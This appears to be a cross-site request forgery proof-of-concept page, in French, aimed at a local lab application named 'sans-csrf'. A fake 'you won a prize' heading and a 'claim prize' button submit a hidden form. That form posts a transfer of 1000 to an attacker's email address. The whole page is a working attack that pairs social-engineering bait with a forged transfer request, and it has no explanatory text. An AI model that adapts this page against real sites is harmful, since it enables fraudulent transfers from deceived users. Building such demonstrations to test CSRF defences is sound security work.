<html>
<body>
  <h1>Vous avez gagné un prix ! Cliquez pour réclamer.</h1>
  <form action="http://localhost/sans-csrf/process_transfer.php" method="POST" id="maliciousForm">
    <input type="hidden" name="recipientEmail" value="attaquant@example.com">
    <input type="hidden" name="amount" value="1000">
  </form>
  <button onclick="document.getElementById('maliciousForm').submit()">Réclamer Prix</button>
</body>
</html>
